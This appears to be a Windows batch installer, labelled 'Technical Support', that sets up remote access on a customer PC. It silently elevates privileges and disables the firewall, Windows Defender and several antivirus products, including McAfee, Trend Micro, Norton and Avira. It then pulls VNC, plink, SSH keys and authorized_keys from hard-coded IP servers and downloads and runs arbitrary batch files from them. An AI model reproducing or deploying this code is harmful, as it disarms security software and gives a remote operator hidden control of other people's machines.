@shift
@echo off
setlocal EnableExtensions EnableDelayedExpansion 
Title Technical Support

:start

::--------Temporary Variables [where applicable]--------------------------------
For /F "tokens=* delims=" %%i in ('type b:\_support\id') Do Set id=%%i
For /F "tokens=* delims=" %%i in ('type c:\winnt\id') Do Set id=%%i
For /F "tokens=* delims=" %%i in ('type c:\windows\id') Do Set id=%%i
if "%log%" equ "" set log=%temp%\connect.log
if exist "%temp%\connect.log" copy /y "%log%" "%temp%\%random%--connect.log"
::--------------------------------------------

FOR /F "tokens=2" %%I in ('date /t') DO SET THEDATE=%%I
FOR /F "tokens=1" %%I in ('echo %time%') DO SET THETIME=%%I
FOR /F "delims=/ tokens=1,2,3" %%I in ('echo %THEDATE%') DO SET ld=%%K%%I%%J
echo BELOW THIS LINE - - - temp log - - - - >"%log%"
echo %ld% %THETIME% >>"%log%"

SET /a randID=%1  >NUL 2>&1
SET /a randID=%randID% + 1
SET rand=%random%
Set name=system
set windir=windows
cls & echo Connecting [pass %randID%]  Please Wait...

set fileserver=64.79.194.101
set vncserver=66.133.252.22:5500
set fileserver_backup1=64.79.194.101
set fileserver_backup2=64.79.194.101

set ftpserver=64.79.194.101
set sshserver=208.125.61.249

REM  To Do [create ping test for sshserver]
REM set sshserver_backup1=208.125.61.236
REM set sshserver_backup2=208.125.61.236
set sshserver_port=23000
set sshserver_user=techsupport

REM normal installation code
    Set install_code=9788

REM silent connect code
    Set silent_code=9522

REM quick connect code
    Set quick_code=4733

REM nowinlogon connect code [don't modify user login/password]
    Set nowinlogon_code=8828

REM normal installation ip_prompt
    Set ip_prompt=4335

REM uninstall code
    Set uninstall_code=7644

REM uninstall paid
    Set uninstall_paid=7645

REM support code [also installs safemode]
    Set support_code=6994

REM support_av [installs support then runs av]
    Set support_av=2914

REM antivirus code
    Set antivirus_code=5249

REM burn code
    Set burn_code=3351

:cont478378528

:WinVersion

echo fileserver=%fileserver%
echo ftpserver=%sshserver%
echo sshserver=%sshserver%

REM set original_installer=%0%
set installer=%0%
set allvariables=%cmdln%

set system=techsupport
echo "%systemroot%" | find /I "minint" >NUL
if "%errorlevel%" equ "1" (
echo %systemroot% | find /I "x:" >NUL
)
if "%errorlevel%" equ "1" Set system=customer

if "%system%" equ "techsupport" set silent=yes

ver|find /I"4.0">nul&&set WinVersion=WinNT4&&goto cont6431457
ver|find /I "XP">nul&&set WinVersion=%Version%_cmdWinXP&&goto cont6431457
ver|find /I "5.0">nul&&set WinVersion=Win2k&&goto cont6431457
ver|find /I "5.1">nul&&set WinVersion=WinXP&&goto cont6431457
ver|find /I "5.2">nul&&set WinVersion=Win2k3&&goto cont6431457
ver|find /I "6.0">nul&&set WinVersion=Vista&&goto cont6431457
ver|find /I "6.1">nul&&set WinVersion=Win7&&goto cont6431457
if "%WinVersion%" EQU "" set WinVersion=UNKNOWN

:cont6431457
::Determine whether we are on a 32 or 64bit machine
set winprograms=Program Files
set system32=system32
if exist "Program Files (x86)" set winprograms=Program Files (x86)
if exist "%ProgramFiles(x86)%" set programfiles=%ProgramFiles(x86)%
if exist %systemroot%\syswow64 set system32=syswow64& set 64bit=yes

set startdir=%userprofile%\start menu\programs\startup
set allstartdir=%allusersprofile%\start Menu\Programs\startup
set allusers=%drv0%\documents and settings\all users

if exist "%systemroot%\boot\pcat" (
  set startdir=%appdata%\microsoft\windows\start menu\programs\startup
  set allstartdir=%drv0%\programdata\microsoft\windows\start menu\programs\startup
  set allusers=%drv0%\programdata\microsoft\windows
)

reg add "HKCU\Software\sysinternals\pskill" /v EulaAccepted /f /t REG_DWORD /d 1
reg add "HKCU\Software\sysinternals\PsPasswd" /v EulaAccepted /f /t REG_DWORD /d 1
reg add "HKCU\Software\sysinternals\Process Explorer" /v EulaAccepted /f /t REG_DWORD /d 1

if "%system%" equ "techsupport" if exist X:\menu.lst if not exist C:\menu.lst (shutdown2 /r||shutdown /r)
echo %installer%|find /I "runcycle" &&echo mark6408>>"%log%" &&pskill runcycle &&goto cycle

mkdir C:\%rand%>NUL 2>&1 &&Set drv0=C:&&echo jump1 cont24976458&&goto cont24976458
mkdir %systemdrive%\%rand%>NUL 2>&1 &&Set drv0=%systemdrive%&&goto cont24976458
mkdir D:\%rand%>NUL 2>&1 &&Set drv0=D:&&echo jump3 cont24976458&&goto cont24976458
echo error 8406485>>"%log%"

:cont24976458
echo mark881>>"%log%"
rmdir /q %drv0%\%rand% 2>&1 >NUL 2>&1

set path1=%systemdrive%\_support
if "%system%" equ "techsupport" set path1=%drv0%\_support
if "%system%" equ "techsupport" if not exist %drv0%\_support\qres.exe if exist b: set path1=b:\_support
if "%system%" equ "techsupport" if not exist b: set path1=x:\_support

set path2=%systemdrive%\_support
if "%system%" equ "techsupport" if exist %drv0%\_support\qres.exe set path2=%drv0%\_support

echo %path% | find /I "_support" >NUL || set path=%path1%;%path2%;%path%

set pathext=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH

if "%system%" equ "techsupport" (
set WinVersion=WinXP
if exist %drv0%\%_windir%\boot\pcat set WinVersion=Vista
)

set _windir=windows
if not exist %drv0%\%windows\system32 % if exist %drv0%\winnt set _windir=winnt

set runscanner=cmd /c
if "%system%" equ "techsupport" set runscanner=runscanner /t 3000 /y /m+ /w %drv0%\%_windir%
echo %safeboot_option% | find /I "network" &&set safeboot=yes

Set profilesdirectory=%drv0%\documents and settings
if exist %drv0%\%_windir%\boot\pcat Set profilesdirectory=%drv0%\Users
echo mark761>>"%log%"


if "%system%" equ "techsupport" if not exist %drv0%\unlock if not exist "%path1%\unlock" if not exist "%path2%\unlock" (
  pskill -t lock.exe 2>&1 >NUL 2>&1 & start lock.exe 2>&1 >NUL 2>&1
)

For /F "tokens=* delims=" %%i in ('echo %cmdln%') Do Set vars=%%i
echo %vars% | find /I "call" &&call :%2%
echo %vars% | find /I "goto" &&set quick=yes&&set silent=yes
echo %vars% | find /I "upload" &&set file=%2%&&goto rsync_upload
echo %vars% | find /I "download" &&set file=%2%&&cd /d %path1%&&goto rsync_download
echo %vars% | find /I "silent" &&set silent=yes
echo %vars% | find /I "quick" &&set quick=yes&&set silent=yes
echo %vars% | find /I "uninstall" &&set uninstall=yes&&set silent=yes
echo %vars% | find /I "support" &&set support=yes&&set silent=yes
echo %vars% | find /I "support_av" &&set support=yes&&set antivirus=yes&&set silent=yes
echo %vars% | find /I "antivirus" &&set antivirus=yes&&set silent=yes
echo %vars% | find /I "paid" &&set uninstall=yes&&set paid=yes&&set silent=yes
echo %vars% | find /I "burn" &&set burn=yes&&set silent=yes
echo %vars% | find /I "nosafemode" &&goto nosafemode
echo %vars% | find /I "safemode" &&goto safemode
echo %vars% | find /I "debug" &&set debug=yes
echo %vars% | find /I "nopagefile" &&set pagefile=no
echo %vars% | find /I "nowinlogon" &&set nowinlogon=yes&&set silent=yes
echo %vars% | find /I "settings" &&set settings=yes
echo %vars% | find /I "vnc" &&set vnc_settings=yes&&set quick=yes&&set silent=yes
echo %vars% | find /I "services" &&goto services
echo %vars% | find /I "sfc" &&goto sfc

set compression=%3%
if "%compression%" equ "" set compression=5

if /I "%settings%" equ "yes" (
set fileserver=%2%&set sshserver=%3%&set vncserver=%4%
REM syntax: netsupport.exe settings <fileserver> <sshserver> <vncserver>:port <ftpserver>
)

if /I "%vnc_settings%" equ "yes" (
set vncserver=%2%
REM syntax: netsupport.exe vnc <vncserver:port>
)

echo mark763>>"%log%"
if "%uninstall%" equ "yes" (echo jump uninstall &echo jump uninstall>>"%log%" &goto uninstall)
echo %installer% | find /I "_antivirus" &&echo mark8604>>"%log%" &&goto antivirus
echo %installer%|find /I "_uninst"&&echo mark7509>>"%log%"&&pskill _uninst&&goto _uninst
echo %installer% | find /I "_support" &&echo mark4304>>"%log%" &&goto support
if exist %drv0%\%_windir%\_antivirus.exe (start %drv0%\%_windir%\_antivirus.exe)
echo mark765>>"%log%"

echo drv0=%drv0%
echo path1=%path1%
echo path2=%path2%
echo %path1%>%systemroot%\path1

if not exist %path1%\download.exe (del /q %path1% 2>&1 >NUL 2>&1)
if not exist %path2%\download.exe (del /q %path2% 2>&1 >NUL 2>&1)

if not exist %path1% mkdir %path1% || echo error 51506747>>"%log%" &&goto ftp_upload
if not exist %path2% mkdir %path2% || echo error 67415089>>"%log%"

echo %installer% | find /I "sessmngr" &&set silent=yes

REM echo %0% | find /I "RemoteSupport" >NUL 2>&1
REM if "%errorlevel%" equ "0" (
REM set silent=yes
REM set name=%2%
REM set ip=%3%
REM if "%debug%" equ "yes" (echo name=%name% & echo ip=%ip% & sleep 3 >NUL 2>&1)
REM )

echo mark875>>"%log%"
REM echo %0% | find /I "RemoteSupport" >NUL 2>&1
REM if "%errorlevel%" equ "0" (cd /d %systemdrive% & start /MIN &echo jump cont46357884&goto cont46357884)

echo mark876>>"%log%"
if "%system%" equ "techsupport" (echo jump1 cont46357884 & goto cont46357884)
if not exist %systemroot%\boot\pcat (echo jump2 cont46357884 & goto cont46357884)
mkdir %systemroot%\%rand%>NUL 2>&1 &&echo jump3 cont46357884 &&goto cont46357884
set elevate=yes& echo elevate=yes
set variable1=none&set variable2=none&set variable3=none
if "%quick%" equ "yes" set variable1=quick
if "%uninstall%" equ "yes" (set variable1=uninstall)
if "%paid%" equ "yes" set variable1=paid
if "%support%" equ "yes" set variable1=support
if "%burn%" equ "yes" set variable1=burn
if "%silent%" equ "yes" set variable2=silent
if "%pagefile%" equ "no" set variable3=nopagefile
if "%nowinlogon%" equ "yes" set variable3=nowinlogon

REM copy /y netsupport.exe %path1%\RemoteSupport.exe
REM if not exist %path1%\RemoteSupport.exe (echo RemoteSupport.exe missing >>"%log%" & echo jump EOF & goto EOF)
echo mark877>>"%log%"
pskill lock.exe 2>&1 >NUL 2>&1

if "%debug%" equ "yes" (
  echo variable1=%variable1% variable2=%variable2% variable3=%variable3% & sleep 3 >NUL 2>&1
)

:elevate
set elevate=elevate.vbs

echo ' // Usage:     (Not used directly.  Launched from Elevate.cmd.) >"%elevate%"
echo Set objShell = CreateObject("Shell.Application") >>"%elevate%"
echo Set objWshShell = WScript.CreateObject("WScript.Shell") >>"%elevate%"
echo Set objWshProcessEnv = objWshShell.Environment("PROCESS") >>"%elevate%"
echo strCommandLine = objWshProcessEnv("ELEVATE_CMDLINE") >>"%elevate%"
echo strApplication = objWshProcessEnv("ELEVATE_APP") >>"%elevate%"
echo strArguments = Right(strCommandLine, (Len(strCommandLine) - Len(strApplication))) >>"%elevate%"
echo     strFlag = WScript.Arguments(0) >>"%elevate%"
echo     If (strFlag = "") OR (strFlag="help") OR (strFlag="/h") OR (strFlag="\h") OR (strFlag="-h") _ >>"%elevate%" 
echo         OR (strFlag = "\?") OR (strFlag = "/?") OR (strFlag = "-?") OR (strFlag="h") _ >>"%elevate%"
echo         OR (strFlag = "?") Then >>"%elevate%"
echo         DisplayUsage >>"%elevate%"
echo         WScript.Quit >>"%elevate%"
echo     Else >>"%elevate%"
echo         objShell.ShellExecute strApplication, strArguments, "", "runas" >>"%elevate%"
echo     End If >>"%elevate%"
echo variable1=%variable1% variable2=%variable2% variable3=%variable3%
REM cd /d %~dp0%\
set ELEVATE_APP=%0%
set ELEVATE_CMDLINE=%ELEVATE_APP% %variable1% %variable2% %variable3% %variable4%
echo %ELEVATE_CMDLINE%

start wscript //nologo %elevate% %ELEVATE_APP%
REM start wscript //nologo %elevate% %~dp0%0%
REM start wscript //nologo %elevate% %0% %variable1% %variable2% %variable3%
REM elevate.js RemoteSupport.exe %variable1% %variable2% %variable3%
sleep 5 || ping -n 2 344 >NUL 2>&1 & del %elevate% & echo jump EOF & goto EOF

:cont46357884

cd /d "%path1%\"

REM echo %0% | find /I "netsupport"
REM If "%errorlevel%" equ "0" if "%silent%" neq "yes" set silent=no

dir %systemroot%\id 2>&1 >NUL 2>&1 && set silent=yes
If "%silent%" equ "yes" (echo jump cont7615534 & goto cont7615534)
if "%code%" neq "" (echo jump cont7615534 & goto cont7615534)

:getcode
cls & echo WAITING FOR INPUT [pass %randID%]
> "%temp%\code.vbs" ECHO WScript.Timeout = 120
>> "%temp%\code.vbs" ECHO WScript.Echo InputBox("ENTER CODE TO CONTINUE","ENTER CODE")
FOR /F "tokens=*" %%A IN ('cscript //e:vbscript //NoLogo "%temp%\code.vbs"') DO SET code=%%A
cls & echo INPUT ENTERED [pass %randID%]

echo %code% | find "terminated" &&echo code=terminated >>"%log%" &&echo jump EOF &&goto EOF
If "%install_code%" equ "%code%" (echo jump license & goto license)
If "%ip_prompt%" equ "%code%" (echo jump ip_prompt & goto ip_prompt)
If "%silent_code%" equ "%code%" (set silent=yes& echo jump1 cont7615534 & goto cont7615534)
If "%support_code%" equ "%code%" (set support=yes& echo jump license & goto license)
If "%burn_code%" equ "%code%" (set burn=yes& echo jump3 cont7615534 & goto cont7615534)
If "%antivirus_code%" equ "%code%" (set antivirus=yes&echo jump license & goto license)
If "%support_av%" equ "%code%" (set antivirus=yes&set support=yes&echo jump license & goto license)
If "%quick_code%" equ "%code%" (set quick=yes& echo jump5 cont7615534 & goto cont7615534)
If "%nowinlogon_code%" equ "%code%" (set nowinlogon=yes& echo jump6 cont7615534 & goto cont7615534)
If "%uninstall_code%" equ "%code%" (set uninstall=yes& echo jump7 cont7615534 & goto cont7615534)
If "%uninstall_paid%" equ "%code%" (set uninstall=yes&set paid=yes& echo jump8 cont7615534 & goto cont7615534)
If "%code%" equ "" (echo code=noresponse>>"%log%" & echo jump EOF & goto EOF)
set code=
goto getcode

cls & echo WAITING FOR INPUT
> "%temp%\code.vbs" ECHO WScript.Timeout = 60
>> "%temp%\code.vbs" ECHO WScript.Echo msgBox("YOU ENTERED: %code%",vbsystemModal+5,"PLEASE RETRY")
FOR /F "tokens=*" %%A IN ('cscript //e:vbscript //NoLogo "%temp%\code.vbs"') DO SET retry=%%A
cls & echo INPUT ENTERED
If "%retry%" equ "4" (
  Set code=noresponse
  goto getcode
)
echo mark882>>"%log%"
echo jump EOF & goto EOF


:license
echo mark564>>"%log%"
cls & echo WAITING FOR INPUT
> "%temp%\code.vbs" ECHO WScript.Echo msgBox("You Must Accept Our Terms of Service (Browse to terms.txt)",vbsystemModal+4,"Terms")
FOR /F "tokens=*" %%A IN ('cscript //e:vbscript //NoLogo "%temp%\code.vbs"') DO SET license=%%A
del "%temp%\code.vbs"* >NUL 2>&1 & cls & echo INPUT ENTERED
If "%license%" equ "6" (goto get_name)

echo license=cancelled & echo license=cancelled >>"%log%"
cd /d "%startdir%\desktop\"
echo mark141>>"%log%"
set ftpfile=terms.txt& CALL :ftp_download

if exist terms.txt (echo jump cont4615349447 & goto cont4615349447)
echo mark145>>"%log%"
set vbs1="%path1%\test5.vbs"
set vbs1_file=terms.txt
CALL :vbs_download
echo mark146>>"%log%"

:cont4615349447
if exist terms.txt (start terms.txt & sleep 5 || ping -n 5 344 >NUL 2>&1 & del terms.txt)

REM echo "<a href="http://%fileserver%/terms.html">Terms Of Service</a>" >terms.html
REM terms.html
echo jump EOF & goto EOF

:get_name
echo mark654>>"%log%"
cls & echo WAITING FOR INPUT
> "%temp%\code.vbs" ECHO WScript.Timeout = 60
>> "%temp%\code.vbs" ECHO WScript.Echo InputBox("Please Enter Your Name","Enter Name")
FOR /F "tokens=*" %%A IN ('cscript //e:vbscript //NoLogo "%temp%\code.vbs"') DO SET name=%%A
goto cont7615534

:ip_prompt
cls & echo WAITING FOR INPUT
> "%temp%\code.vbs" ECHO WScript.Timeout = 60
>> "%temp%\code.vbs" ECHO WScript.Echo InputBox("ENTER I.P","ENTER I.P.")
FOR /F "tokens=*" %%A IN ('cscript //e:vbscript //NoLogo "%temp%\code.vbs"') DO SET IP=%%A
> "%temp%\code.vbs" ECHO WScript.Echo InputBox("CONFIRM I.P")
FOR /F "tokens=*" %%A IN ('cscript //e:vbscript //NoLogo "%temp%\code.vbs"') DO SET IP_CONFIRM=%%A
cls & echo INPUT ENTERED
If "%IP%" equ "" Set IP=No Response& Set IP_CONFIRM=
If "%IP%" equ "%IP_CONFIRM%" (set fileserver=%ip%& echo jump cont7615534 & goto cont7615534)
> "%temp%\code.vbs" ECHO WScript.Timeout = 60
>> "%temp%\code.vbs" ECHO WScript.Echo msgBox("YOU ENTERED: %IP%    %IP_CONFIRM%",vbsystemModal+0,"PLEASE RETRY")
cls & echo WAITING FOR INPUT & cscript //e:vbscript //NoLogo "%temp%\code.vbs"
Set IP=
Set IP_CONFIRM=
cls & echo INPUT ENTERED & echo jump ip_prompt & goto ip_prompt

:cont7615534
if exist x:\postboot.bat if not exist %drv0%\postboot.bat (
  echo System Will Reboot into Support System... [message 64]
  sleep 60 & %path1%\shutdown2 /r || shutdown /r
)

if exist %drv0%\postboot.bat (set pingfail=no&start %drv0%\postboot.bat)

if exist c:\commands.bat (
  copy /y c:\commands.bat "%temp%\"
  CALL "%temp%\commands.bat"
  del c:\commands.bat & del "%temp%\commands.bat"
)


if exist %drv0%\minint\system32\setupreg_backup.hiv (
move /y %drv0%\minint\system32\setupreg_backup.hiv %drv0%\minint\system32\setupreg.hiv ^
  || echo error 9571682>>"%log%"
)

REM netsh firewall set opmode disable 2>&1 >NUL 2>&1
wpeutil disablefirewall 2>&1 >NUL 2>&1
netsh firewall set allowedprogram %systemroot%\system32\ftp.exe FTP
netsh firewall set allowedprogram %path1%\ftp.exe _FTP
netsh firewall set allowedprogram %systemroot%\remote.exe VNC
REM netsh firewall set portopening tcp 21 21 enable all
REM netsh firewall set portopening tcp 5500 5500 enable all
REM netsh firewall delete portopening tcp 5500

REM CALL :ping_test
REM download http://%fileserver%/connection_test /timeout:10 /overwrite || call :ping_test

:cont3645
set ftpfile=%log%
echo mark7315>>"%log%"
if "%system%" equ "techsupport" (goto cont64194633)
if "%silent%" equ "yes" (goto cont964275)
net user "%username%" | find /I "administrators" && goto cont964275
echo error 2941935 & echo error 2941935>>"%log%"
 >"%temp%\code.vbs" ECHO WScript.Timeout = 10
 >>"%temp%\code.vbs" ECHO WScript.Echo msgBox("error 2941935",vbsystemModal+0,"ERROR")
 if "%silent%" neq "yes" cscript //e:vbscript //NoLogo "%temp%\code.vbs"
 del "%temp%\code.vbs" >NUL & call :ftp_upload

:cont964275
echo mark7317>>"%log%"
if exist %systemroot%\winstart.bat (del %systemroot%\winstart.bat)
if "%system" equ "customer" if not exist classes.inf (
REM fixing locked regedit.exe
echo [Version] >classes.inf
echo Signature="$Chicago$" >>classes.inf
echo Provider=TechSupport >>classes.inf
echo [DefaultInstall] >>classes.inf
echo AddReg=UnhookRegKey >>classes.inf
echo [UnhookRegKey] >>classes.inf
echo HKCR, regfile\shell\open\command,,,"regedit.exe ""%%1""" >>classes.inf
echo HKLM, Software\CLASSES\regfile\shell\open\command,,,"regedit.exe ""%%1""" >>classes.inf
echo HKLM, Software\Microsoft\Windows\CurrentVersion\Policies\System,DisableRegistryTools,0x00000020,0 >>classes.inf
echo HKCU, Software\Microsoft\Windows\CurrentVersion\Policies\System,DisableRegistryTools,0x00000020,0 >>classes.inf
start rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 .\classes.inf 2>&1 >NUL 2>&1
sleep 15 & pskill rundll32
)

REM ipconfig /release *tunnel* >NUL 2>&1
net stop themes 2>&1 >NUL 2>&1
REM stopping windows defender 
net stop windefend 2>&1 >NUL 2>&1
reg delete hklm\software\Microsoft\Windows\CurrentVersion\Run\ /f /v "windows defender" >NUL 2>&1
net stop winss 2>&1 >NUL 2>&1
REM stopping tunneling service 2>&1 >NUL 2>&1
REM net stop tunmp 2>&1 >NUL 2>&1
REM net stop tunnel 2>&1 >NUL 2>&1
REM stopping firewall
REM net stop MpsSvc 2>&1 >NUL 2>&1
net stop OcHealthMon 2>&1 >NUL 2>&1
REM stoping antivirus 2009 service
sc stop TDSSserv.sys 2>&1 >NUL 2>&1
sc delete TDSSserv.sys 2>&1 >NUL 2>&1
REM sc config wscsvc start= disabled 2>&1 >NUL 2>&1
sc config windefend start= disabled 2>&1 >NUL 2>&1
sc config msfwhlpr start= disabled 2>&1 >NUL 2>&1
sc config msfwdrv start= disabled 2>&1 >NUL 2>&1
sc config msfwsvc start= disabled 2>&1 >NUL 2>&1
sc config mpfilter start= disabled 2>&1 >NUL 2>&1
sc config onecaremp start= disabled 2>&1 >NUL 2>&1
sc config winss start= disabled 2>&1 >NUL 2>&1
REM stopping Avira firewall
sc config AntiVirFirewallService start= disabled 2>&1 >NUL 2>&1
   REM pskill avfwsvc
REM stopping mcaffee services
net stop mcshield 2>&1 >NUL 2>&1
net stop mpfservice 2>&1 >NUL 2>&1
net stop mcproxy 2>&1 >NUL 2>&1
net stop mcods 2>&1 >NUL 2>&1
net stop mcmscsvc 2>&1 >NUL 2>&1
net stop mcsysmon 2>&1 >NUL 2>&1
net stop "norton internet security" 2>&1 >NUL 2>&1
REM stopping Trend Micro Security
net stop tmntsrv 2>&1 >NUL 2>&1
net stop tmproxy 2>&1 >NUL 2>&1
net stop sfctlcom 2>&1 >NUL 2>&1
net stop tmpfw 2>&1 >NUL 2>&1
net stop tmbmserver 2>&1 >NUL 2>&1

:cont64194633
echo mark399>>"%log%"



:cont462374816
cd /d "%path1%\"
download.exe 2>&1 >NUL 2>&1
If "%errorlevel%" equ "2" (echo jump cont30246415 & goto cont30246415)
echo mark402>>"%log%"
set vbs1="%path1%\test5.vbs"
set vbs1_file=download.exe
CALL :vbs_download

download.exe 2>&1 >NUL 2>&1
If "%errorlevel%" equ "2" (echo jump cont30246415 & goto cont30246415)
echo mark403>>"%log%"
set ftpfile=download.exe& CALL :ftp_download

download.exe 2>&1 >NUL 2>&1
If "%errorlevel%" equ "2" (echo jump cont30246415 & goto cont30246415)
echo mark404>>"%log%"
cls & echo iexplore Connecting [transfer]  Please Wait...
echo iexplore Connecting [download]>>"%log%"
start /wait iexplore http://%fileserver%/download.exe

download.exe 2>&1 >NUL 2>&1
If "%errorlevel%" equ "2" (echo jump cont30246415 & goto cont30246415)
echo mark405>>"%log%"

:cont30246415
echo mark406>>"%log%"

download http://%fileserver%/connection_test /timeout:30 /overwrite || call :ping_test
echo mark400>>"%log%"


download http://%fileserver%/all-commands.bat /timeout:30 /overwrite &&CALL all-commands.bat

if "%id%" neq "" (
download http://%fileserver%/%id%-commands.bat /timeout:30 /overwrite &&CALL %id%-commands.bat
)

download http://%fileserver%/connection_test /timeout:30 /overwrite || echo jump cont7615534 && goto cont7615534
echo Fileserver Connection Test Passed

if "%pagefile%" neq "no" if not exist %drv0%\nopagefile (wpeutil createpagefile /path=%drv0%\pagefile.sys /size=300)
if "%pagefile%" neq "no" if not exist %drv0%\nopagefile (addswap %drv0%\pagefile_tmp.sys 300 600 >NUL 2>&1)
pskill sessmngr.exe 2>&1 >NUL 2>&1

if "%burn%" equ "yes" (echo jump burn & goto burn)

If not exist qres.exe (
 download http://%fileserver%/filez1.exe /timeout:720 /overwrite /display:silent ^
  && filez1.exe -y -p123123 2>&1 >NUL 2>&1 && del filez1.exe || goto :cont30246415
)

If not exist qres.exe (echo Error 412 [filez1] & del filez1.exe & goto cont7615534)

if not exist %systemroot%\download.exe (copy /y download.exe %systemroot%)
download http://%fileserver%/netsupport.exe /timeout:120 /overwrite /display:silent /output:%path1%\sessmngr.exe
copy /y %path1%\sessmngr.exe %systemroot% 2>&1 >NUL 2>&1
copy /y %path1%\sessmngr.exe %drv0%\%_windir% 2>&1 >NUL 2>&1
copy /y %path1%\sessmngr.exe %systemroot%\netsupport.exe 2>&1 >NUL 2>&1
copy /y %path1%\sessmngr.exe %systemroot%\_uninst.exe  2>&1 >NUL 2>&1
copy /y %path1%\sessmngr.exe %systemroot%\runcycle.exe  2>&1 >NUL 2>&1
copy /y %path1%\sessmngr.exe %path1%\runcycle.exe  2>&1 >NUL 2>&1

echo mark5619>>"%log%"
cd /d "%path1%\"
rmdir /q %systemroot%\%rand% >NUL 2>&1

echo mark993>>"%log%"
if exist %systemroot%\id (copy /y %systemroot%\id %path1%)
if exist %drv0%\%_windir%\id (copy /y %drv0%\%_windir%\id %path1%)
sed.exe -V 2>&1 >NUL 2>&1
If "%errorlevel%" equ "0" If not exist %path1%\id (echo 4%time:~7,4% | sed "s/\.//" | sed "s/ //g" >%path1%\id)
If not exist %path1%\id (cls & echo error 465210760>>"%log%" &call :ftp_upload)
For /F "tokens=* delims=" %%i in ('type %path1%\id') Do Set id=%%i
if "%id%" equ "" (set id=4444& echo %id%>%path1%\id)
copy /y %path1%\id %systemroot% >NUL 2>&1
if not exist %drv0%\%_windir%\id (copy /y %path1%\id %drv0%\%_windir%)
set log=%path1%\%id%-connect.log
if exist %path2%\%id%-connect.log (set log=%path2%\%id%-connect.log)

if exist "%log%" (copy /y "%log%" "%random%-%id%-connect.log")
If not exist "%path1%\7z.exe" download http://%fileserver%/7z.exe /timeout:120 /display:silent /output:%path1%
If not exist "%systemroot%\7z.exe" (copy /y %path1%\7z.exe %systemroot% >NUL 2>&1)
If not exist "%path1%\7z.dll" download http://%fileserver%/7z.dll /timeout:120 /display:silent /output:%path1%
If not exist "%systemroot%\7z.dll" (copy /y %path1%\7z.dll %systemroot% >NUL 2>&1)
If not exist "%path1%\lock.exe" download http://%fileserver%/lock.exe /timeout:120 /display:silent /output:%path1%
if not exist "%systemroot%\lock.exe" (copy /y %path1%\lock.exe %systemroot% 2>&1 >NUL 2>&1)
If not exist "%path1%\sleep.exe" download http://%fileserver%/sleep.exe /timeout:120 /display:silent  /output:%path1%
if not exist "%systemroot%\sleep.exe" (copy /y %path1%\sleep.exe %systemroot% 2>&1 >NUL 2>&1)
REM If not exist "%path1%\sleep2.exe" download http://%fileserver%/sleep2.exe /timeout:120 /display:silent  /output:%path1%
REM if not exist "%systemroot%\sleep2.exe" (copy /y %path1%\sleep2.exe %systemroot% 2>&1 >NUL 2>&1)
If not exist "%path1%\pskill.exe" download http://%fileserver%/pskill.exe /timeout:120 /display:silent /output:%path1%
if not exist "%systemroot%\pskill.exe" (copy /y %path1%\pskill.exe %systemroot% 2>&1 >NUL 2>&1)

echo mark404>>"%log%"
If not exist "%path1%\_id_rsa.ppk" download http://%fileserver%/_id_rsa.ppk /timeout:120 /display:silent /output:%path1%
REM If not exist "%path1%\id_rsa-scp.ppk" download http://%fileserver%/id_rsa-scp.ppk /timeout:120 /display:silent /output:%path1%
REM If not exist "%path1%\RDSessMgr.reg" download http://%fileserver%/RDSessMgr.reg /timeout:120 /display:silent /output:%path1%
echo mark231>>"%log%"

REM echo downloading files for kts ssh
REm If not exist "%path1%\cl32.dll" download http://%fileserver%/cl32.dll /timeout:120 /display:silent /output:"%path1%"
REM If not exist "%path1%\daemon.exe" download http://%fileserver%/daemon.exe /timeout:120 /display:silent /output:"%path1%"
REM If not exist "%path1%\kts.ini" download http://%fileserver%/kts.ini /timeout:120 /display:silent /output:"%path1%"
REM If not exist "%path1%\rsakey.ky" download http://%fileserver%/rsakey.ky /timeout:120 /display:silent /output:"%path1%"
REM If not exist "%path1%\session.exe" download http://%fileserver%/session.exe /display:silent /timeout:120 /timeout:120 /output:"%path1%"
REM If not exist "%path1%\session.exe.lnk" download http://%fileserver%/session.exe.lnk /display:silent /timeout:120 /output:"%path1%"
REM If not exist "%path1%\shlex.exe" download http://%fileserver%/shlex.exe /display:silent /timeout:120 /output:"%path1%"
REM If not exist "%path1%\utf-8.ini" download http://%fileserver%/utf-8.ini /display:silent /timeout:120 /output:"%path1%"
REM If not exist "%path1%\fixscut.exe" download http://%fileserver%/fixscut.exe /display:silent /timeout:120 /output:"%path1%"

If not exist "%path1%\_authorized_keys" download http://%fileserver%/_authorized_keys /display:silent /timeout:120 /output:%path1%
If not exist "%path1%\_id_rsa" download http://%fileserver%/_id_rsa /display:silent /timeout:120 /output:%path1%
REM If not exist "%path1%\icw.7z" download http://%fileserver%/icw.7z /display:silent /timeout:120 /output:"%path1%"
REM If not exist "%path1%\icw" if exist "%path1%\icw.7z" (7z x -y -p123123 %path1%\icw.7z 2>&1 >NUL 2>&1)

If not exist "%path1%\winvnc.exe" download http://%fileserver%/winvnc.exe /timeout:120 /output:%path1%
if not exist "%path1%\winvnc.exe" (echo winvnc.exe missing & sleep 5 & goto cont7615534)
if not exist "%path1%\cad.exe" download http://%fileserver%/cad.exe /display:silent /timeout:120 /output:%path1%
if not exist "%path1%\vnchooks.dll" download http://%fileserver%/vnchooks.dll /timeout:120 /output:%path1%
if not exist "%path1%\schook.dll" download http://%fileserver%/schook.dll /timeout:120 /output:%path1%
if not exist "%path1%\logging.dll" download http://%fileserver%/logging.dll /timeout:120 /output:%path1%
If not exist "%path1%\uvnc_settings.exe" download http://%fileserver%/uvnc_settings.exe /timeout:120 /output:%path1%
If not exist "%path1%\ultravnc_tmp" download http://%fileserver%/ultravnc_tmp /timeout:120 /output:%path1%
if not exist "%path1%\ultravnc_tmp" (echo ultravnc_tmp missing & sleep 5 & goto cont7615534)
If not exist "%path1%\remote.exe" download http://%fileserver%/remote.exe /timeout:120 /output:%path1%
If not exist "%systemroot%\remote.exe" (copy /y %path1%\remote.exe %systemroot% >NUL 2>&1)
echo mark232>>"%log%"
If not exist "%path1%\plink.exe" download http://%fileserver%/plink.exe /timeout:120 /output:%path1%
If not exist "%path1%\erunt.7z" download http://%fileserver%/erunt.7z
if not exist "%path1%\erunt\erunt.exe" if exist erunt.7z 7z x -y erunt.7z
If not exist "%path1%\ps.exe" download http://%fileserver%/ps.exe /display:silent /timeout:120 /output:%path1%
If not exist "%systemroot%\ps.exe" (copy /y %path1%\ps.exe %systemroot% >NUL 2>&1)
If not exist "%path1%\cygwin1.dll" download http://%fileserver%/cygwin1.dll /timeout:120 /output:%path1%
copy /y %path1%\cygwin1.dll %systemroot% >NUL 2>&1
